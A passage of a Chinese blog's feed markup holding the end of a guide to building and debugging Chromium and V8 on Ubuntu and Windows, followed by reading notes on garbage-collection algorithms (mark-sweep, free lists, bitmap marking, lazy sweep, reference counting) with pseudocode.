将gef目录下的gef.py添加进/root/.gdbinit中，内容如下</span></span><br><span class="line"><span class="comment"># source /root/tools/gef/gef.py</span></span><br></pre></td></tr></table></figure><h4 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">sudo <span class="comment">#./setup.sh</span></span><br><span class="line"><span class="comment"># 如果显示异常，检查.gdbinit文件</span></span><br><span class="line"><span class="comment"># source /root/tools/pwndbg/gdbinit.py</span></span><br></pre></td></tr></table></figure><h4 id="peda"><a href="#peda" class="headerlink" title="peda"></a>peda</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/longld/peda.git ~/peda</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;source ~/peda/peda.py&quot;</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><p>还需要将v8的gdb插件放入gdbinit中，路径如下（路径取决于自己本机环境）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/root/v8/v8/tools/gdbinit</span><br></pre></td></tr></table></figure><h1 id="Windows-chromium-v8调试环境搭建"><a href="#Windows-chromium-v8调试环境搭建" class="headerlink" title="Windows chromium+v8调试环境搭建"></a>Windows chromium+v8调试环境搭建</h1><p>有了上面ubuntu安装的经验，再windows上搭建调试环境会轻松不少。</p><p>windows里面需要额外安装SDK以及vs，毕竟需要vs进行调试。</p><h2 id="v8环境配置-1"><a href="#v8环境配置-1" class="headerlink" title="v8环境配置"></a>v8环境配置</h2><p>1、下载安装vs2019或者vs2022，并配置python环境</p><p>2、下载<a class="link"   href="https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/" >SDK<i class="fas fa-external-link-alt"></i></a>并安装</p><p>3、下载安装<code>depot_tools</code>，并配置depot_tools安装目录的环境变量并确保其在python的环境变量前</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools</span><br></pre></td></tr></table></figure><p>4、配置环境变量</p><p>三个环境变量，编译chromium也需要他们，depot_tools的环境变量要在python的上面（vs的路径按照自己电脑的路径）</p><table><thead><tr><th>DEPOT_TOOLS_WIN_TOOLCHAIN</th><th><strong>vs2022_install</strong></th><th><strong>PATH</strong></th></tr></thead><tbody><tr><td>0</td><td>C:\Program Files\Microsoft Visual Studio\2022\Community</td><td>C:\software\depot_tools</td></tr></tbody></table><p>5、运行gclient，初始化工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gclient</span><br></pre></td></tr></table></figure><p>6、fetch源码并更新，其他的步骤就和ubuntu的一样了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir v8 &amp;&amp; <span class="built_in">cd</span> v8</span><br><span class="line">fetch v8</span><br><span class="line">gclient sync</span><br><span class="line"><span class="built_in">cd</span> v8</span><br><span class="line">python tools\dev\gm.py x64.debug</span><br></pre></td></tr></table></figure><p>如果不使用gm.py脚本，也可以使用gn工具进行构建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd E:\v8\v8</span><br><span class="line">gn gen --ide=vs out\default --args=&quot;is_component_build = true is_debug = true v8_optimized_debug = false&quot;</span><br></pre></td></tr></table></figure><p>上面的命令会生成工作目录，路径为E:\v8\v8\out\Default，里面有一个all.sln的文件，使用vs打开</p><p>之后在160个项目中找到gn_all，编译之，最后即可调试E:\v8\v8\out\Default\d8.exe。</p><h2 id="chromium环境配置-1"><a href="#chromium环境配置-1" class="headerlink" title="chromium环境配置"></a>chromium环境配置</h2><p>配置vs和SDK还有环境变量等过程和上面配置v8时一致，只是在最后fetch和编译时有些许差别</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir chromium &amp;&amp; <span class="built_in">cd</span> chromium</span><br><span class="line">fetch chromium</span><br><span class="line"><span class="built_in">cd</span> src</span><br><span class="line">gn gen out/debug_comp --args=<span class="string">&quot;is_debug=true is_component_build=true&quot;</span> </span><br><span class="line">autoninja -C out/debug_comp chrome</span><br></pre></td></tr></table></figure><p>或者使用vs进行编译调试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gn gen --ide=vs out\debug_by_vs --args=&quot;is_component_build = true is_debug = true v8_optimized_debug = false&quot;</span><br></pre></td></tr></table></figure><p>最后找到gn_all，编译之，最终得到可执行文件。</p><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a class="link"   href="https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/windows_build_instructions.md#Setting-up-Windows" >https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/windows_build_instructions.md#Setting-up-Windows<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://blog.csdn.net/HermitSun/article/details/106091018" >https://blog.csdn.net/HermitSun/article/details/106091018<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://www.anquanke.com/post/id/253048" >https://www.anquanke.com/post/id/253048<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ubuntu-chromium-v8调试环境搭建&quot;&gt;&lt;a href=&quot;#ubuntu-chromium-v8调试环境搭建&quot; class=&quot;headerlink&quot; title=&quot;ubuntu chromium+v8调试环境搭建&quot;&gt;&lt;/a&gt;ubuntu chromiu</summary>
      
    
    
    
    <category term="环境搭建" scheme="https://fa1lr4in.github.io/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="浏览器" scheme="https://fa1lr4in.github.io/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    <category term="环境搭建" scheme="https://fa1lr4in.github.io/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>垃圾回收算法与实现</title>
    <link href="https://fa1lr4in.github.io/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    <id>https://fa1lr4in.github.io/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/</id>
    <published>2021-12-09T02:26:54.000Z</published>
    <updated>2022-04-19T09:11:38.437Z</updated>
    
    <content type="html"><![CDATA[<h1 id="垃圾回收的算法与实现"><a href="#垃圾回收的算法与实现" class="headerlink" title="垃圾回收的算法与实现"></a>垃圾回收的算法与实现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章与其说是blog，不如说是reading notes。里面大部分内容都参考自《垃圾回收的算法与实现》。另一部分则是笔者对v8的官方blog和源码进行分析得出。作者的文字内容逻辑清晰，通俗易懂，笔者受益匪浅，相信每个人阅读此书都有种醍醐灌顶的感觉。笔者仅仅是将书中的内容理解并归纳，方便日后应用可以找到理论依据，也是将自己的学习历程记录下来。我会用尽量精炼且逻辑清晰的语言描述一些概念，而不是用长篇累牍的描述与书中相同的东西，那毫无意义，这样做的目的是为了自己在多年后看到这篇文章仍然可以快速回忆起里面的内容，也希望可以帮助大家快速的掌握GC相关的知识。</p><p>here we go！</p><h2 id="算法篇"><a href="#算法篇" class="headerlink" title="算法篇"></a>算法篇</h2><h3 id="一些定义"><a href="#一些定义" class="headerlink" title="一些定义"></a>一些定义</h3><p><code>对象</code>：对象是 GC 的基本单位；对象由<code>头（header）</code>和<code>域（field）</code>构成，<code>头（header）</code>描述了对象的特征并可能设有一些flag数据结构，而<code>域（field）</code>则表示对象的数据部分。</p><p><code>mutator</code>：相当于进程，在运行的过程中会对内存进行操作，可以产生或销毁对象，也是GC的目标。</p><p><code>堆</code>：GC的主要目标，对象的分配和GC都在这里进行。$heap_start +  HEAP_SIZE == $heap_end</p><p><code>活动对象/非活动对象</code>：能通过 mutator 引用的对象称为“活动对象”。不能通过mutator 引用的对象称为“非活动对象”。</p><p><code>chunk</code>：对象所占用的那块空间。</p><p><code>根（root）</code>：是指向对象的指针的“起点”部分。寄存器、调用栈、全局变量空间这些都是根，因为他们可以指向活动对象。</p><p><code>【评价标准】吞吐量</code>：处理同样大小的堆需要的时间，时间越小吞吐量越大。</p><p><code>【评价标准】最大暂停时间</code>：GC会使 mutator 暂停执行，所有次GC中时间消耗最久的即为最大暂停时间，该指标影响了人机交互体验。</p><p><code>【评价标准】堆使用效率</code>：可以解释为完成同样的任务占用的堆空间越多，堆使用效率越低。</p><p><code>【评价标准】是否利用缓存优势</code>：具有引用关系的对象在堆中如果相距比较近，则可以提高在缓存中读取到想利用的数据的概率，令 mutator 高速运行。这叫做利用了缓存优势。</p><p><code>三大经典算法</code>：分别指GC标记-清除算法（Mark Sweep GC），引用计数法（Reference Counting），GC复制算法（Copying GC）。其他众多GC算法都是从这三种算法衍生出来的。</p><h3 id="GC标记-清除算法（Mark-Sweep-GC）"><a href="#GC标记-清除算法（Mark-Sweep-GC）" class="headerlink" title="GC标记 -清除算法（Mark Sweep GC）"></a>GC标记 -清除算法（Mark Sweep GC）</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>GC 标记 - 清除算法由标记阶段和清除阶段构成。标记阶段会将所有活动对象都做上标记。而清除阶段会将没有标记的对象（即非活动对象）进行内存回收。（John McCarthy 1960年发布）</p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mark_sweep：标记-清除算法，分为标记阶段和清除阶段</span></span><br><span class="line"><span class="built_in">mark_sweep</span>()&#123;</span><br><span class="line"> <span class="built_in">mark_phase</span>()</span><br><span class="line"> <span class="built_in">sweep_phase</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// mark_phase：标记阶段遍历根为活动对象打上标记。</span></span><br><span class="line"><span class="built_in">mark_phase</span>()&#123;</span><br><span class="line"> <span class="keyword">for</span>(r : $roots)</span><br><span class="line"> <span class="built_in">mark</span>(*r)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// mark：对未打上标记的活动对象打上标记，并递归处理子对象。搜索方式属于深搜。</span></span><br><span class="line"><span class="built_in">mark</span>(obj)&#123;</span><br><span class="line"> <span class="keyword">if</span>(obj.mark == FALSE)</span><br><span class="line"> obj.mark = TRUE</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj))</span><br><span class="line"> <span class="built_in">mark</span>(*child)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sweep_phase：清除阶段从堆首遍历到堆尾，将已标记对象置为未标记，将未标记对象释放并链接入空闲链表。</span></span><br><span class="line"><span class="comment">// 标记阶段和清除阶段有一个较大的区别就是标记阶段是从根开始遍历活动对象，而清除阶段是遍历整个堆。所以清除阶段花费的时间要久一点。</span></span><br><span class="line"><span class="built_in">sweep_phase</span>()&#123;</span><br><span class="line">sweeping = $heap_start</span><br><span class="line"> <span class="keyword">while</span>(sweeping &lt; $heap_end) &#123;</span><br><span class="line">     <span class="keyword">if</span>(sweeping.mark == TRUE)</span><br><span class="line">      sweeping.mark = FALSE</span><br><span class="line">     <span class="keyword">else</span> &#123;</span><br><span class="line">         sweeping.field_0 = $free_list<span class="comment">// 我们知道对象有头和域，这里将对象域的第一部分（即field_0）设置为之前空闲链表的第一个元素。</span></span><br><span class="line">         $free_list = sweeping<span class="comment">//此时该对象成为了空闲链表的第一个元素，由于该对象的field_0存放了下一块空闲空间，这样依次就可以把所有空闲的空间都串在一起。</span></span><br><span class="line">         sweeping += sweeping.size</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// new_obj：遍历空闲链表，从中取出合适大小的chunk并返回，如果选中的chunk比较大则对其进行切割。</span></span><br><span class="line"><span class="built_in">new_obj</span>(size)&#123;</span><br><span class="line"> chunk = <span class="built_in">pickup_chunk</span>(size, $free_list)</span><br><span class="line"> <span class="keyword">if</span>(chunk != <span class="literal">NULL</span>)</span><br><span class="line"> <span class="keyword">return</span> chunk</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> <span class="built_in">allocation_fail</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 上面的分配策略叫作 First - fit。发现大于等于size 的chunk时就会立即返回该chunk。</span></span><br><span class="line"><span class="comment">// 第二种策略是遍历空闲链表，返回大于等于 size 的最小chunk，这种策略叫作 Best - fit。</span></span><br><span class="line"><span class="comment">// 最后一种策略叫作 Worst - fit，即找出空闲链表中最大的chunk，将其分割成 mutator 申请的大小和分割后剩余的大小，目的是将分割后剩余的chunk最大化。但因为 Worst - fit 很容易生成大量小的chunk，所以不推荐。</span></span><br></pre></td></tr></table></figure><h4 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h4><h5 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h5><ol><li><code>实现简单</code>：算法简单，实现容易，与其他算法的组合也简单。</li></ol><h5 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h5><ol><li><code>碎片化</code>：空闲链表里面的chunk地址空间一般是不连续的，造成了比较多的内存碎片。这样当分配大对象时即使空闲空间的总大小&gt;=大对象的大小也无法给大对象分配空间。</li><li><code>分配速度较慢</code>：GC 标记 - 清除算法使用了空闲链表的数据结构，这样在分配时需要遍历空闲链表来进行chunk的分配。而GC复制算法和GC标记-压缩等搜索型算法则不需要，它们的空闲空间是连续成块的，需要时将其切割即可。</li><li><code>与写时复制技术不兼容</code>：Linux在Fork进程时有“读时共享，写时复制”的机制。而在GC标记-清除算法的标记阶段会对每个对象进行进行标记，这样相当于对头进行了数据的写入，造成了无谓的内存复制。</li></ol><p>实际上缺点1和2都是空闲链表这个数据结构的问题，缺点三则是标记flag设置的问题。</p><h4 id="优化措施"><a href="#优化措施" class="headerlink" title="优化措施"></a>优化措施</h4><h5 id="多个空闲链表（multiple-free-list）"><a href="#多个空闲链表（multiple-free-list）" class="headerlink" title="多个空闲链表（multiple free-list）"></a>多个空闲链表（multiple free-list）</h5><p>总体来说就是将之前的单个空闲链表变为多个空闲链表，每个空闲链表装固定大小的空闲chunk，解决的是<code>分配速度较慢</code>的问题。</p><p>一般mutator 很少会申请非常大的chunk。为了应对这种极少出现的情况而大量制造空闲链表，我们给chunk大小设定一个上限，chunk如果大于等于这个大小就全部采用一个空闲链表处理。举个例子——如果设定chunk大小上限为 100 个字，那么准备用于 2个字、3 个字、……、100 个字，以及大于等于 101 个字的总共 100 个空闲链表就可以了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// new_obj：分配对象的阶段，根据要分配对象的大小从对应的空闲链表中去取。</span></span><br><span class="line"><span class="built_in">new_obj</span>(size)&#123;</span><br><span class="line"> index = size / (WORD_LENGTH / BYTE_LENGTH)</span><br><span class="line"> <span class="keyword">if</span>(index &lt;= <span class="number">100</span>)</span><br><span class="line"> <span class="keyword">if</span>($free_list[index] != <span class="literal">NULL</span>)</span><br><span class="line"> chunk = $free_list[index]</span><br><span class="line"> $free_list[index] = $free_list[index].next</span><br><span class="line"> <span class="keyword">return</span> chunk</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> chunk = <span class="built_in">pickup_chunk</span>(size, $free_list[<span class="number">101</span>])</span><br><span class="line"> <span class="keyword">if</span>(chunk != <span class="literal">NULL</span>)</span><br><span class="line"> <span class="keyword">return</span> chunk</span><br><span class="line"> <span class="built_in">allocation_fail</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sweep_phase 清除阶段，清除时依据清除对象的大小放入对应的空闲链表中。</span></span><br><span class="line"><span class="built_in">sweep_phase</span>()&#123;</span><br><span class="line"> <span class="keyword">for</span>(i : <span class="number">2.</span><span class="number">.101</span>)</span><br><span class="line"> $free_list[i] = <span class="literal">NULL</span></span><br><span class="line"> sweeping = $heap_start</span><br><span class="line"> <span class="keyword">while</span>(sweeping &lt; $heap_end)</span><br><span class="line"> <span class="keyword">if</span>(sweeping.mark == TRUE)</span><br><span class="line"> sweeping.mark = FALSE</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> index = size / (WORD_LENGTH / BYTE_LENGTH )</span><br><span class="line"> <span class="keyword">if</span>(index &lt;= <span class="number">100</span>)</span><br><span class="line"> sweeping.next = $free_list[index]</span><br><span class="line"> $free_list[index] = sweeping</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> sweeping.next = $free_list[<span class="number">101</span>]</span><br><span class="line"> $free_list[<span class="number">101</span>] = sweeping</span><br><span class="line"> sweeping += sweeping.size</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="BIBOP法（Big-Bag-Of-Pages）"><a href="#BIBOP法（Big-Bag-Of-Pages）" class="headerlink" title="BIBOP法（Big Bag Of Pages）"></a>BIBOP法（Big Bag Of Pages）</h5><p>将堆切成若干块，每块堆空间里面存放的对象大小相同。下图第一部分和第三部分存放的都是三个字大小的对象，而第二部分存放的都是两个字大小的对象。但是有个问题，它不能完全消除碎片化——比方说在第一部分就有空闲chunk，而第二部分还是有活动对象，这样就产生了碎片化，不过可以一定程度上缓解之前的无序状态。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210916162407395.png" alt="BIBOP"></p><h5 id="位图标记法（bitmap-mark）"><a href="#位图标记法（bitmap-mark）" class="headerlink" title="位图标记法（bitmap mark）"></a>位图标记法（bitmap mark）</h5><p>经典的GC标记-清除算法通过在对象的头中设置flag位来实现标记状态的判定，上面也已经提到了这<code>与写时复制技术不兼容</code>，所以我们可以维护一个表格来管理所有对象的标记状态。这个表格就叫做 “位图表格” 。利用这个位图表格进行标记的行为称为 “位图标记”。</p><p>【优点】与写时复制技术兼容：比较好理解，这种方式标记修改的只是位图表格，并没有修改对象。</p><p>【优点】清除操作更高效：由于维护了位图表格，清除阶段取消标志位的过程直接通过遍历位图表格取消置位即可。</p><p>【注意】当堆不同时，offest也不同，这时就需要不同的位图表格来服务每一个堆。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mark：标记阶段，没什么好说的，只是之前标记了对象头，现在标记在位图表格中了。</span></span><br><span class="line"><span class="comment">// 如何通过位图表格元素索引找到对应对象呢？这里维护了bitmap_tbl[index]和offset的对应关系，这里的索引从低到高与堆地址空间从低到高是对应的。</span></span><br><span class="line"><span class="built_in">mark</span>(obj)&#123;</span><br><span class="line"> obj_num = (obj - $heap_start) / WORD_LENGTH</span><br><span class="line"> index = obj_num / WORD_LENGTH</span><br><span class="line"> offset = obj_num % WORD_LENGTH</span><br><span class="line"> <span class="keyword">if</span>(($bitmap_tbl[index] &amp; (<span class="number">1</span> &lt;&lt; offset)) == <span class="number">0</span>)</span><br><span class="line"> $bitmap_tbl[index] |= (<span class="number">1</span> &lt;&lt; offset)</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj))</span><br><span class="line"> <span class="built_in">mark</span>(*child)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sweep_phase：清除阶段同样是遍历堆，但是这里在位图表格中判断对象未被标记时放进空闲链表，如果已被标记则不管。在最后遍历位图表格统一将所有元素都置为未标记 。</span></span><br><span class="line"><span class="built_in">sweep_phase</span>()&#123;</span><br><span class="line"> sweeping = $heap_start</span><br><span class="line"> index = <span class="number">0</span></span><br><span class="line"> offset = <span class="number">0</span></span><br><span class="line"> <span class="keyword">while</span>(sweeping &lt; $heap_end)</span><br><span class="line"> <span class="keyword">if</span>($bitmap_tbl[index] &amp; (<span class="number">1</span> &lt;&lt; offset) == <span class="number">0</span>)</span><br><span class="line"> sweeping.next = $free_list</span><br><span class="line"> $free_list = sweeping</span><br><span class="line"> index += (offset + sweeping.size) / WORD_LENGTH</span><br><span class="line"> offset = (offset + sweeping.size) % WORD_LENGTH</span><br><span class="line"> sweeping += sweeping.size</span><br><span class="line">     </span><br><span class="line"> <span class="keyword">for</span>(i : <span class="number">0.</span>.(HEAP_SIZE / WORD_LENGTH - <span class="number">1</span>))</span><br><span class="line"> $bitmap_tbl[i] = <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="延迟清除法（Lazy-Sweep）"><a href="#延迟清除法（Lazy-Sweep）" class="headerlink" title="延迟清除法（Lazy Sweep）"></a>延迟清除法（Lazy Sweep）</h5><p>延迟清除法是缩减因清除操作而导致的 mutator 最大暂停时间的方法。在标记操作结束后，不进行清除操作，而是如其字面意思一样让它“延迟”，通过“延迟”来防止 mutator 长时间暂停。它没有空闲链表这个数据结构。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// new_obj：这里先使用快速方式从堆的中间部分往下寻找空闲对象，如果找不到。执行完整的GC标记-清除算法，如果仍然找不到则代表堆中没有适合大小的空闲块（因为这里没有空闲链表的数据结构）。这样确保整个堆已经被完整的遍历一遍了。说白了第一次lazy_sweep是快速搜索，第二次lazy_sweep是全量搜索。</span></span><br><span class="line"><span class="built_in">new_obj</span>(size)&#123;</span><br><span class="line"> chunk = <span class="built_in">lazy_sweep</span>(size)<span class="comment">// 第一遍处理，从中间向后进行处理，快速处理。</span></span><br><span class="line"> <span class="keyword">if</span>(chunk != <span class="literal">NULL</span>)</span><br><span class="line"> <span class="keyword">return</span> chunk</span><br><span class="line"> <span class="built_in">mark_phase</span>()</span><br><span class="line"> chunk = <span class="built_in">lazy_sweep</span>(size)<span class="comment">// 第二遍处理是执行完标记再进行的处理，从堆起始位置开始处理，是完整处理。</span></span><br><span class="line"> <span class="keyword">if</span>(chunk != <span class="literal">NULL</span>)</span><br><span class="line"> <span class="keyword">return</span> chunk</span><br><span class="line"> <span class="built_in">allocation_fail</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// lazy_sweep： 清除阶段从sweeping位置开始向堆尾遍历，找到合适大小的空闲chunk就返回作为新对象的chunk。找到的如果是活动对象则将其取消标记。</span></span><br><span class="line"><span class="built_in">lazy_sweep</span>(size)&#123;</span><br><span class="line"> <span class="keyword">while</span>($sweeping &lt; $heap_end)</span><br><span class="line"> <span class="keyword">if</span>($sweeping.mark == TRUE)</span><br><span class="line"> $sweeping.mark = FALSE</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span>($sweeping.size &gt;= size)</span><br><span class="line"> chunk = $sweeping</span><br><span class="line"> $sweeping += $sweeping.size</span><br><span class="line"> <span class="keyword">return</span> chunk</span><br><span class="line">$sweeping += $sweeping.size</span><br><span class="line">     </span><br><span class="line"> $sweeping = $heap_start</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">NULL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种情况下可以减少最大暂停时间，但不是绝对。</p><p>如果某次标记阶段结束后的堆如下——当$sweeping在空闲对象周围时可以马上获得chunk，此时可以减少 mutator 的暂停时间。而一旦$sweeping在活动对象周围时则将长时间获取不到空闲chunk，之后第二次进行了完整的标记-清除的过程反而使 mutator 的暂停时间增加。</p><p>最大暂停时间较长的问题可以通过增量式垃圾回收方式解决（三色标记法）。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210916171310071.png" alt="image-20210916171310071"></p><h3 id="引用计数法（Reference-Counting）"><a href="#引用计数法（Reference-Counting）" class="headerlink" title="引用计数法（Reference Counting）"></a>引用计数法（Reference Counting）</h3><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><p>引用计数法中引入了“计数器”的概念，也就是有多少程序引用了这个对象（被引用数）。（George E. Collins 1960年发布，Harold McBeth 1963解决了循环引用的问题）</p><h4 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h4><h5 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// new_obj：当新创建一个对象时，计数器由0增加到1。</span></span><br><span class="line"><span class="built_in">new_obj</span>(size)&#123;</span><br><span class="line"> obj = <span class="built_in">pickup_chunk</span>(size, $free_list)</span><br><span class="line"> <span class="keyword">if</span>(obj == <span class="literal">NULL</span>)</span><br><span class="line"> <span class="built_in">allocation_fail</span>()</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> obj.ref_cnt = <span class="number">1</span></span><br><span class="line"> <span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="更新引用计数"><a href="#更新引用计数" class="headerlink" title="更新引用计数"></a>更新引用计数</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td 